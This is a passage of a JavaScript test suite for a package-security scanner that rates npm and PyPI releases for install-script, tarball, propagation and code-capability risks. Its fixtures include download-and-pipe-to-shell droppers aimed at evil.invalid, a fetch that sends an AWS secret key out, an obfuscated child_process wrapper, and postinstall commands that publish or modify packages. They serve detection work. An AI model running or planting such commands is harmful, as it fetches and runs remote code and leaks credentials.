    ).not.toContainEqual(expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }));
  });

  test("warns instead of inferring implicit node-gyp when package.json cannot be parsed", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: "{not-json",
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "medium",
        file: "package.json",
        evidence: "package.json parse failed",
        ruleId: "package-json.parse-failed",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }),
    );
  });

  test("keeps tar directory entries informational", () => {
    const findings = tarSuspiciousEntryFindings([
      {
        kind: "non-regular",
        path: "<unknown>",
        detail: "typeflag 5 (directory)",
      },
      {
        kind: "non-regular",
        path: "link",
        detail: "typeflag 2 (symlink)",
      },
    ]);

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "info",
        evidence: "non-regular: typeflag 5 (directory)",
        ruleId: "tar.suspicious-entry",
      }),
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        evidence: "non-regular: typeflag 2 (symlink)",
        ruleId: "tar.suspicious-entry",
      }),
    );
  });

  test("raises entries hidden behind a lone end-of-archive block as high", () => {
    const entries = [
      {
        kind: "parser-differential",
        path: "<archive>",
        detail: "1 entry follows an all-zero block",
      },
    ];
    const npm = tarSuspiciousEntryFindings(entries);
    const pypi = tarSuspiciousEntryFindings(entries, { dialect: "pypi" });

    expect(npm[0]).toEqual(
      expect.objectContaining({
        severity: "high",
        file: "<archive>",
        evidence: "parser-differential: 1 entry follows an all-zero block",
        ruleId: "tar.suspicious-entry",
      }),
    );
    expect(npm[0].reason).toContain("the reader `npm install` extracts with");
    expect(pypi[0].reason).toContain("pip's CPython `tarfile`");
    expect(computeRisk(npm)).toBe("high");
  });

  test("escalates retention-tier findings when hash-only content changed", () => {
    const entries = [
      {
        kind: "retention-tier",
        path: "<archive>",
        detail: "one file body was recorded hash-only",
      },
    ];
    const unchanged = tarSuspiciousEntryFindings(entries, {
      fileDiff: [{ status: "unchanged", flags: ["content-skipped"] }],
    });
    const changed = tarSuspiciousEntryFindings(entries, {
      fileDiff: [{ status: "modified", flags: ["content-skipped"] }],
    });

    expect(unchanged[0].severity).toBe("info");
    expect(changed[0].severity).toBe("medium");
    expect(computeRisk(changed)).toBe("medium");
  });

  test("uses staged metadata to flag implicit node-gyp even when the gyp file is absent from the tarball", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), {
      name: "pkg",
      version: "1.0.1",
      scripts: { install: "node-gyp rebuild" },
      implicitScripts: { install: "node-gyp rebuild" },
      gypfile: true,
    });

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "package.json",
        evidence: "implicit install: node-gyp rebuild",
        ruleId: "install-script.implicit-node-gyp",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ ruleId: "install-script.lifecycle" }),
    );
  });
});

describe("install-time propagation", () => {
  const file = (path, textSample, sha256 = path) => ({
    path,
    size: textSample.length,
    sha256,
    flags: [],
    textSample,
  });

  test.each([
    {
      command: "npm version --no-git-tag-version patch && npm publish",
      ruleId: "propagation.registry-publish",
      severity: "critical",
    },
    {
      command:
        "node -e \"require('node:fs').writeFileSync('node_modules/pkg/package.json', '{}')\"",
      ruleId: "propagation.package-mutation",
      severity: "high",
    },
  ])("scans direct lifecycle commands for $ruleId", ({ command, ruleId, severity }) => {
    const packageJson = JSON.stringify({ scripts: { postinstall: command } });
    const staged = [file("package.json", packageJson)];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({ ruleId, severity, file: "package.json", line: 1 }),
    );
  });

  test("ignores publish commands that only appear in lifecycle-script comments", () => {
    const packageJson = JSON.stringify({ scripts: { postinstall: "node install.js" } });
    const staged = [
      file("package.json", packageJson),
      file("install.js", "// Maintainers run npm publish from the release workflow.\nexport {};\n"),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "propagation.registry-publish")).toBe(
      false,
    );
  });

  test("does not treat importing twine as a registry upload", () => {
    const staged = [
      file(
        "sdist/setup.py",
        "# Maintainers use twine upload from CI.\nimport twine\nfrom setuptools import setup\nsetup()\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });

    expect(findings.some((finding) => finding.ruleId === "propagation.registry-publish")).toBe(
      false,
    );
  });

  test("does not reach an unrelated file that only shares a lifecycle target basename", () => {
    const packageJson = JSON.stringify({ scripts: { postinstall: "node setup.js" } });
    const staged = [
      file("package.json", packageJson),
      file("setup.js", "export {};\n"),
      file(
        "tools/setup.js",
        "const libnpmpublish = () => {};\nlibnpmpublish({ name: 'release-tool' });\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "propagation.registry-publish")).toBe(
      false,
    );
  });

  test("keeps a newly added package mutation in release risk when its first match is unchanged", () => {
    const packageJson = JSON.stringify({ scripts: { postinstall: "node install.js" } });
    const previous = [
      file("package.json", packageJson, "package-json"),
      file(
        "install.js",
        "const fs = require('node:fs');\nconst path = require('node:path');\nconst root = 'node_modules';\nfor (const name of fs.readdirSync(root)) console.log(name);\n",
        "old-install",
      ),
    ];
    const staged = [
      file("package.json", packageJson, "package-json"),
      file(
        "install.js",
        "const fs = require('node:fs');\nconst path = require('node:path');\nconst root = 'node_modules';\nfor (const name of fs.readdirSync(root)) console.log(name);\nfs.writeFileSync(path.join(root, 'pkg', 'package.json'), '{}');\n",
        "new-install",
      ),
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(deterministicFindings(staged, diff), diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });
    const mutation = annotated.find((finding) => finding.ruleId === "propagation.package-mutation");

    expect(mutation).toMatchObject({ line: 3, diffStatus: "modified", releaseDelta: true });
    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
  });

  test("keeps an added registry publish in release risk when an earlier match is unchanged", () => {
    const packageJson = JSON.stringify({ scripts: { postinstall: "node install.js" } });
    const previous = [
      file("package.json", packageJson, "package-json"),
      file("install.js", "libnpmpublish({ name: 'first' });\n", "old-install"),
    ];
    const staged = [
      file("package.json", packageJson, "package-json"),
      file(
        "install.js",
        "libnpmpublish({ name: 'first' });\nlibnpmpublish.publish({ name: 'second' });\n",
        "new-install",
      ),
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(deterministicFindings(staged, diff), diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });
    const publish = annotated.find((finding) => finding.ruleId === "propagation.registry-publish");

    expect(publish).toMatchObject({ line: 1, diffStatus: "modified", releaseDelta: true });
    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("critical");
  });

  test("does not make an existing propagation finding release-scoped for a new comment", () => {
    const packageJson = JSON.stringify({ scripts: { postinstall: "node install.js" } });
    const previous = [
      file("package.json", packageJson, "package-json"),
      file("install.js", "libnpmpublish({ name: 'first' });\n", "old-install"),
    ];
    const staged = [
      file("package.json", packageJson, "package-json"),
      file(
        "install.js",
        "libnpmpublish({ name: 'first' });\n/* Maintainers run npm publish from CI. */\n",
        "new-install",
      ),
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(deterministicFindings(staged, diff), diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });
    const publish = annotated.find((finding) => finding.ruleId === "propagation.registry-publish");

    expect(publish).toMatchObject({ line: 1, diffStatus: "modified", releaseDelta: false });
  });
});

describe("computeRisk weighted multi-signal roll-up (issue #193)", () => {
  const code = (ruleId, severity, extra = {}) => ({ ruleId, severity, file: "f.js", ...extra });

  test("a lone process-execution capability de-escalates to low", () => {
    // The benign-build-script false positive: a build helper that shells out is
    // not, on its own, evidence of risk.
    expect(computeRisk([code("code.process-execution", "high")])).toBe("low");
  });

  test("two distinct code capabilities co-occur to high", () => {
    expect(
      computeRisk([code("code.process-execution", "high"), code("code.credential-access", "high")]),
    ).toBe("high");
  });

  test("two individually-weak (medium) capabilities still escalate to high", () => {
    // Under max-severity this stalled at medium and under-detected; co-occurrence
    // now treats the combination as the multi-signal risk it is.
    expect(
      computeRisk([
        code("code.network-access", "medium"),
        code("code.dynamic-evaluation", "medium"),
      ]),
    ).toBe("high");
  });

  test("a lone remote-shell capability is not de-escalated", () => {
    // `code.remote-shell` used to live inside `code.process-execution`, so
    // `execSync('curl … | bash')` scored as one weak capability and the release
    // rolled up to low — the gate then recommended approve. Shelling out to a
    // compiler and shelling out to the network are not the same evidence.
    expect(computeRisk([code("code.remote-shell", "high")])).toBe("high");
    expect(computeRisk([code("code.remote-shell", "critical")])).toBe("critical");
  });

  test("co-occurrence is a floor, not a ceiling", () => {
    // The co-occurrence branch used to return a flat "high", which meant adding a
    // second capability could *lower* a critical one. Escalation must never
    // de-escalate.
    expect(
      computeRisk([code("code.remote-shell", "critical"), code("code.process-execution", "high")]),
    ).toBe("critical");
  });

  test("an obfuscated lone capability is not de-escalated", () => {
    // Assembling `child_process` from string fragments is itself a malice signal,
    // so a lone obfuscated process-execution keeps its severity.
    expect(computeRisk([code("code.process-execution", "high", { obfuscated: true })])).toBe(
      "high",
    );
  });

  test("a lone non-process capability keeps its own severity", () => {
    // eval/atob on an added file stays high (obfuscation survives base64 wrapping)…
    expect(computeRisk([code("code.dynamic-evaluation", "high")])).toBe("high");
    // …while a lone modified-file network read stays medium.
    expect(computeRisk([code("code.network-access", "medium")])).toBe("medium");
  });

  test("authoritative non-code findings still set a severity floor on their own", () => {
    expect(computeRisk([{ ruleId: "file.outside-files-list", severity: "high", file: "x" }])).toBe(
      "high",
    );
    expect(
      computeRisk([{ ruleId: "install-script.preinstall", severity: "critical", file: "p" }]),
    ).toBe("critical");
  });

  test("an install-hook anchor floors a lone process-execution to high", () => {
    expect(
      computeRisk([
        { ruleId: "install-script.lifecycle", severity: "high", file: "package.json" },
        code("code.process-execution", "high"),
      ]),
    ).toBe("high");
  });

  test("findings without a rule id anchor at their severity (fail toward higher risk)", () => {
    expect(computeRisk([{ severity: "high", file: "x" }])).toBe("high");
  });

  test("no findings is low", () => {
    expect(computeRisk([])).toBe("low");
  });
});

describe("packed downloader capability detection", () => {
  const pkg = {
    path: "package.json",
    size: 80,
    sha256: "pkg",
    flags: [],
    textSample: JSON.stringify({ name: "pkg", version: "1.0.1", main: "index.js" }),
  };
  const file = (textSample) => ({
    path: "index.js",
    size: textSample.length,
    sha256: "index",
    flags: [],
    textSample,
  });

  test("treats a literal node eval child process as process plus dynamic execution", () => {
    const staged = [
      pkg,
      file(
        "const { spawn } = require('node:child_process');\nspawn('node', ['-e', '[defanged payload]'], { detached: true });\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ ruleId: "code.process-execution", severity: "high" }),
        expect.objectContaining({ ruleId: "code.dynamic-evaluation", severity: "high" }),
      ]),
    );
    expect(computeRisk(findings)).toBe("high");
  });

  test("detects a literal node eval child process split across lines", () => {
    const staged = [
      pkg,
      file(
        "const { spawn } = require('node:child_process');\nspawn(\n  'node',\n  [\n    '-e',\n    '[defanged payload]',\n  ],\n  { detached: true },\n);\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ ruleId: "code.process-execution", severity: "high" }),
        expect.objectContaining({
          ruleId: "code.dynamic-evaluation",
          severity: "high",
          line: 2,
        }),
      ]),
    );
    expect(computeRisk(findings)).toBe("high");
  });

  test("marks a process capability inside a rotating string-table wrapper as obfuscated", () => {
    const staged = [
      pkg,
      file(
        "const _0x8f31 = _0x2aa1;\n(function (_0x41aa, _0x55bb) { const _0x77cc = _0x2aa1; const _0x99dd = _0x41aa(); while (!![]) { try { const _0x1234 = parseInt(_0x77cc(0x1)); if (_0x1234 === _0x55bb) break; _0x99dd['push'](_0x99dd['shift']()); } catch (_0xabcd) { _0x99dd['push'](_0x99dd['shift']()); } } })(_0x4e21, 0x1);\nfunction _0x2aa1(_0x1111) { return _0x4e21()[_0x1111]; }\nfunction _0x4e21() { return ['node', '-e', '[defanged payload]']; }\nif (false) spawn(_0x8f31(0x0), [_0x8f31(0x1), _0x8f31(0x2)]);\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const processExecution = findings.find(
      (finding) => finding.ruleId === "code.process-execution",
    );

    expect(processExecution).toMatchObject({ severity: "high", obfuscated: true });
    expect(computeRisk(findings)).toBe("high");
  });
});

describe("test-scoped capability findings", () => {
  const pkg = (main = "index.js") => ({
    path: "package.json",
    size: 60,
    sha256: "pkg",
    flags: [],
    textSample: JSON.stringify({ name: "pkg", version: "1.0.0", main }),
  });
  const file = (path, textSample) => ({ path, size: 60, sha256: path, flags: [], textSample });

  test("demotes capability findings in unreachable test files and marks them test-scoped", () => {
    const staged = [
      pkg(),
      file("index.js", "module.exports = {};\n"),
      file(
        "test/spawn.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    const processExec = findings.find((finding) => finding.ruleId === "code.process-execution");
    expect(processExec).toMatchObject({
      file: "test/spawn.js",
      severity: "medium",
      testScoped: true,
    });
    expect(processExec.evidence).toContain("test-scoped");
  });

  test("keeps full severity when the test file is reachable from the entrypoint", () => {
    const staged = [
      pkg(),
      file("index.js", "require('./test/spawn.js');\n"),
      file(
        "test/spawn.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/spawn.js",
      severity: "high",
    });
  });

  test("keeps full severity when a lifecycle script points into the test tree", () => {
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.0",
          main: "index.js",
          scripts: { postinstall: "node test/setup.js" },
        }),
      },
      file("index.js", "module.exports = {};\n"),
      file(
        "test/setup.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/setup.js",
      severity: "high",
    });
  });

  test("keeps full severity for files transitively imported by a lifecycle script", () => {
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.0",
          main: "index.js",
          scripts: { postinstall: "node test/setup.js" },
        }),
      },
      file("index.js", "module.exports = {};\n"),
      file("test/setup.js", "require('./helper.js');\n"),
      file(
        "test/helper.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/helper.js",
      severity: "high",
    });
  });

  test("keeps full severity for obfuscated capabilities even in test files", () => {
    const staged = [
      pkg(),
      file("index.js", "module.exports = {};\n"),
      file(
        "test/hidden.js",
        "const m = require(['chi', 'ld_pro', 'cess'].join(''));\nm['exec' + 'Sync']('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/hidden.js",
      severity: "high",
      obfuscated: true,
    });
  });

  test("keeps a same-file credential→network exfiltration chain at full severity in test files", () => {
    const staged = [
      pkg(),
      file("index.js", "module.exports = {};\n"),
      file(
        "test/exfil.js",
        "const env = process.env.AWS_SECRET_ACCESS_KEY;\nfetch('https://example.invalid', { body: env });\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
      file: "test/exfil.js",
      severity: "high",
    });
  });

  test("test-scoped capabilities do not co-occur into a high risk roll-up", () => {
    const testScoped = (ruleId, severity) => ({
      ruleId,
      severity,
      file: "test/a.js",
      testScoped: true,
    });
    expect(
      computeRisk([
        testScoped("code.process-execution", "medium"),
        testScoped("code.credential-access", "low"),
        testScoped("code.dynamic-evaluation", "low"),
      ]),
    ).toBe("low");
    // A non-test capability still escalates against another non-test capability.
    expect(
      computeRisk([
        { ruleId: "code.network-access", severity: "medium", file: "index.js" },
        { ruleId: "code.credential-access", severity: "medium", file: "index.js" },
        testScoped("code.process-execution", "medium"),
      ]),
    ).toBe("high");
  });
});

describe("baseline finding fingerprints", () => {
  test("keeps a line-less modified-file finding contextual when the baseline already fired the same rule", () => {
    const previous = [
      {
        path: "lib/util.js",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      },
    ];
    const staged = [
      {
        path: "lib/util.js",
        size: 70,
        sha256: "new",
        flags: [],
        textSample:
          "const { execSync } = require('child_process');\nexecSync('node -v');\n// touched\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "lib/util.js",
          evidence: "process or shell execution",
          reason: "package may execute arbitrary commands",
          ruleId: "code.process-execution",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );
    expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: false });
  });

  test("fails open to release delta when the baseline has no matching finding", () => {
    const previous = [
      {
        path: "lib/util.js",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "export const a = 1;\n",
      },
    ];
    const staged = [
      {
        path: "lib/util.js",
        size: 70,
        sha256: "new",
        flags: [],
        textSample: "export const a = 2;\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "lib/util.js",
          evidence: "process or shell execution",
          reason: "package may execute arbitrary commands",
          ruleId: "code.process-execution",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );
    expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: true });
  });
});

describe("code.remote-shell release-delta classification", () => {
  const manifest = { name: "p", version: "1.0.1", main: "index.js" };

  test("a decoy shell token in an untouched line does not hide the added dropper", () => {
    // Regression: `patternsForFinding` had no case for `code.remote-shell`, so
    // the rule could only be release-delta when its recorded line happened to
    // be a changed line — and the recorded line is the *first* match in the
    // file. Any pre-existing `curl`/`wget`/`nc` token earlier in the file (a
    // comment, a usage string) pinned it to an unchanged line and dropped the
    // newly added dropper out of `releaseRisk`, which is what the workflow gate
    // reads. The gate then recommended approve.
    const previousFiles = [
      {
        path: "package.json",
        size: 40,
        sha256: "a",
        flags: [],
        textSample: JSON.stringify({ name: "p", version: "1.0.0", main: "index.js" }),
      },
      {
        path: "index.js",
        size: 60,
        sha256: "b",
        flags: [],
        textSample: "// see: curl https://example.invalid/docs\nconst a = 1;\n",
      },
    ];
    const stagedFiles = [
      {
        path: "package.json",
        size: 40,
        sha256: "c",
        flags: [],
        textSample: JSON.stringify(manifest),
      },
      {
        path: "index.js",
        size: 160,
        sha256: "d",
        flags: [],
        textSample:
          "// see: curl https://example.invalid/docs\nconst a = 1;\n" +
          'require("child_process").execSync("wget http://evil.invalid/p -O /tmp/p && /tmp/p");\n',
      },
    ];

    const diff = createPackageDiff(previousFiles, stagedFiles);
    const annotated = annotateFindingsWithDiffStatus(
      deterministicFindings(stagedFiles, diff, manifest),
      diff,
      { previousFiles, stagedFiles },
    );

    const remoteShell = annotated.find((finding) => finding.ruleId === "code.remote-shell");
    expect(remoteShell).toBeDefined();
    // The recorded line is still the decoy on line 1 — that is where the first
    // pattern match is — but the finding is release delta because the rule's
    // patterns also match the added line.
    expect(remoteShell.releaseDelta).toBe(true);
    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
  });
});

describe("code.remote-shell download-and-execute coverage", () => {
  const manifest = { name: "p", version: "1.0.1", main: "index.js" };

  function findingsFor(path, source) {
    const stagedFiles = [
      {
        path: "package.json",
        size: 40,
        sha256: "c",
        flags: [],
        textSample: JSON.stringify(manifest),
      },
      { path, size: source.length, sha256: "d", flags: [], textSample: source },
    ];
    const diff = createPackageDiff([], stagedFiles);
    return deterministicFindings(stagedFiles, diff, manifest).filter(
      (finding) => finding.ruleId === "code.remote-shell",
    );
  }

  // The download-and-execute regex used to require the interpreter token to sit
  // immediately after the *first* pipe, so both the absolute-path form and any
  // intermediate stage — `| base64 -d | bash` is the standard obfuscated
  // dropper — fell back to the `high` tier that a bare shell tool earns.
  test.each([
    ["a bare interpreter", 'execSync("curl -s https://evil.invalid/p.sh | bash");'],
    ["an absolute path", 'execSync("curl -s https://evil.invalid/p.sh | /bin/bash");'],
    ["a base64 stage", 'execSync("curl -s https://evil.invalid/p | base64 -d | bash");'],
    ["a decompression stage", 'execSync("curl -sL https://evil.invalid/p.gz | gunzip | sh");'],
    ["a privilege prefix", 'execSync("curl -s https://evil.invalid/p.sh | sudo -E bash");'],
    ["an env prefix", 'execSync("wget -qO- https://evil.invalid/p.sh | env sh");'],
    ["a versioned interpreter", 'execSync("curl -s https://evil.invalid/p | python3.11 -");'],
    ["backtick substitution", "execSync(`eval \\`curl -s https://evil.invalid/p\\``);"],
  ])("pipes into %s at critical", (_label, command) => {
    const findings = findingsFor("index.js", `require("child_process").${command}\n`);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("critical");
  });

  // The trailing word boundary is what separates an interpreter from a
  // checksum tool; without it `| sha256sum` reads as `sh`.
  test.each([
    ["sha256sum", 'execSync("curl -s https://example.invalid/f | sha256sum");'],
    ["shasum", 'execSync("curl -s https://example.invalid/f | shasum -a 256");'],
  ])("does not read %s as an interpreter", (_label, command) => {
    const findings = findingsFor("index.js", `require("child_process").${command}\n`);
    expect(findings[0]?.severity).not.toBe("critical");
  });

  test("a curl mentioned only in comments does not raise a capability", () => {
    // The executor requirement is satisfied by any spawn API in the same file,
    // so a CLI that both shells out and documents its HTTP equivalent — the
    // most common real shape — used to raise `high` on prose.
    const findings = findingsFor(
      "cli.js",
      'import { execFileSync } from "node:child_process";\n' +
        "// Equivalent to: curl -X POST https://api.example.invalid/v1/deploys\n" +
        "/*\n * Or: wget -qO- https://api.example.invalid/v1/status\n */\n" +
        'export const branch = () => execFileSync("git", ["rev-parse", "HEAD"]);\n',
    );
    expect(findings).toHaveLength(0);
  });

  test("a real command on a code line still raises a capability", () => {
    const findings = findingsFor(
      "cli.js",
      'import { execSync } from "node:child_process";\n' +
        "// Equivalent to: curl -X POST https://api.example.invalid/v1/deploys\n" +
        'export const sync = () => execSync("curl -s https://api.example.invalid/v1/sync");\n',
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
  });

  // Build infrastructure runs on a CI runner at build time, never on a
  // consumer's install, and every mainstream toolchain documents this idiom.
  test.each([
    ["Dockerfile", "RUN curl -fsSL https://deb.nodesource.com/setup_18.x | bash -\n"],
    [".github/workflows/ci.yml", "      - run: curl -LsSf https://astral.sh/uv/install.sh | sh\n"],
    ["Makefile", "bootstrap:\n\tcurl -sSL https://install.python-poetry.org | python3 -\n"],
    ["docker/Dockerfile.alpine", "RUN wget -qO- https://example.invalid/install.sh | sh\n"],
    [".circleci/config.yml", "      - run: curl -fsSL https://get.pnpm.io/install.sh | sh -\n"],
  ])("does not fire on %s", (path, source) => {
    expect(findingsFor(path, source)).toHaveLength(0);
  });

  test("build infrastructure that also spawns keeps the lower tier", () => {
    // The exemption and the critical tier are withheld together: if something
    // else in the file satisfies the executor requirement, the finding is still
    // a bare shell-tool capability, not download-and-execute.
    const findings = findingsFor(
      "Dockerfile.build",
      "RUN node -e \"require('child_process').execSync('echo hi')\"\n" +
        "RUN curl -fsSL https://example.invalid/setup.sh | bash\n",
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
  });
});

describe("package-json.entrypoint-missing", () => {
  const manifestFile = (manifest) => ({
    path: "package.json",
    size: 120,
    sha256: "pkg",
    flags: [],
    textSample: JSON.stringify(manifest, null, 2),
  });
  const file = (path) => ({
    path,
    size: 10,
    sha256: path,
    flags: [],
    textSample: "module.exports={}",
  });

  function findingsFor(manifest, paths, previous = null, options = {}) {
    const staged = [manifestFile(manifest), ...paths.map(file)];
    const diff = previous ? createPackageDiff(previous, staged) : [];
    return deterministicFindings(staged, diff, manifest, {
      entrypointResolution: "npm",
      ...options,
    }).filter((finding) => finding.ruleId === "package-json.entrypoint-missing");
  }

  test("flags a main the package does not ship", () => {
    const findings = findingsFor({ name: "pkg", version: "1.0.0", main: "index.cjs" }, []);

    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({ severity: "medium", file: "package.json" });
    expect(findings[0].evidence).toContain("index.cjs");
  });

  test("escalates when the previous release shipped the entrypoint", () => {
    // The scan 163a1e40-c049-4587-8525-85b4393d2eed shape: the build output
    // left the tarball while the manifest kept pointing at it.
    const manifest = { name: "pkg", version: "0.1.0", main: "index.cjs" };
    const previous = [
      manifestFile({ name: "pkg", version: "0.0.1", main: "index.cjs" }),
      file("index.cjs"),
      file("acorn.wasm"),
    ];

    const findings = findingsFor(manifest, [], previous);

    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
    expect(findings[0].evidence).toContain("the previous version shipped it");
  });

  test("escalates when the previous release shipped an implicitly resolved main", () => {
    const manifest = { name: "pkg", version: "0.1.0", main: "dist/index" };
    const previous = [manifestFile({ ...manifest, version: "0.0.1" }), file("dist/index.js")];

    const findings = findingsFor(manifest, [], previous);

    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
  });

  function annotate(manifest, previous) {
    const staged = [manifestFile(manifest)];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff, manifest, {
      entrypointResolution: "npm",
    }).filter((finding) => finding.ruleId === "package-json.entrypoint-missing");

    return annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });
  }

  test("is a release-scoped finding so a broken release counts against release risk", () => {
    const manifest = { name: "pkg", version: "0.1.0", main: "index.cjs" };
    const previous = [manifestFile({ ...manifest, version: "0.0.1" }), file("index.cjs")];

    const [annotated] = annotate(manifest, previous);

    expect(annotated).toMatchObject({ severity: "high", releaseDelta: true });
  });

  test("does not scope an always-over-claimed entrypoint to the release", () => {
    // The predecessor did not ship it either, so the manifest has been stale
    // for at least a release: package context, not this release's regression.
    const manifest = { name: "pkg", version: "0.1.0", main: "index.cjs" };
    const previous = [manifestFile({ ...manifest, version: "0.0.1" })];

    const [annotated] = annotate(manifest, previous);

    expect(annotated).toMatchObject({ severity: "medium", releaseDelta: false });
  });

  test("stays silent for an ecosystem that did not opt into entrypoint resolution", () => {
    // A Python sdist that bundles JS assets carries a root package.json; it must
    // not be held to npm's require() semantics.
    const manifest = { name: "pkg", version: "1.0.0", main: "lib/index.js" };
    const staged = [manifestFile(manifest), file("setup.py")];

    expect(
      deterministicFindings(staged, [], manifest, { codePatternSet: "python" }).filter(
        (finding) => finding.ruleId === "package-json.entrypoint-missing",
      ),
    ).toEqual([]);
  });

  test("flags every missing bin command and exports target once per path", () => {
    const findings = findingsFor(
      {
        name: "pkg",
        version: "1.0.0",
        main: "dist/index.js",
        bin: { pkg: "./bin/cli.js", "pkg-dev": "./bin/cli.js" },
        exports: { ".": { require: "./dist/index.cjs", import: "./dist/index.mjs" } },
      },
      [],
    );

    // Two bin commands point at the same file: one path, one finding.
    expect(findings.map((finding) => finding.evidence).sort()).toEqual([
      "bin pkg bin/cli.js is not in the package",
      "exports dist/index.cjs is not in the package",
      "exports dist/index.mjs is not in the package",
      "main dist/index.js is not in the package",
    ]);
  });

  test.each([
    ["extensionless main", { main: "index" }],
    ["extensionless bin", { bin: { pkg: "cli" } }],
  ])("flags a missing %s path", (_name, manifest) => {
    expect(findingsFor({ name: "pkg", version: "1.0.0", ...manifest }, [])).toHaveLength(1);
  });

  test.each([
    ["exports", { exports: "./dist/index" }, ["dist/index.js"]],
    ["bin", { bin: { pkg: "./bin/cli" } }, ["bin/cli.js"]],
  ])("requires an exact %s target", (_name, manifest, paths) => {
    expect(findingsFor({ name: "pkg", version: "1.0.0", ...manifest }, paths)).toHaveLength(1);
  });

  test("does not treat an arbitrary child as a resolvable directory main", () => {
    expect(
      findingsFor({ name: "pkg", version: "1.0.0", main: "lib" }, ["lib/thing.js"]),
    ).toHaveLength(1);
  });

  test.each(["cjs", "mjs"])("does not implicitly append .%s to an npm main", (extension) => {
    expect(
      findingsFor({ name: "pkg", version: "1.0.0", main: "dist/index" }, [
        `dist/index.${extension}`,
      ]),
    ).toHaveLength(1);
  });

  test.each(["js", "json", "node"])(
    "uses npm's package-root index.%s fallback after an unresolved main",
    (extension) => {
      const manifest = { name: "pkg", version: "1.0.0", main: "dist/index.js" };
      const previous = [
        manifestFile({ ...manifest, version: "0.9.0" }),
        file("dist/index.js"),
        file(`index.${extension}`),
      ];

      expect(findingsFor(manifest, [`index.${extension}`], previous)).toEqual([]);
    },
  );

  test.each([
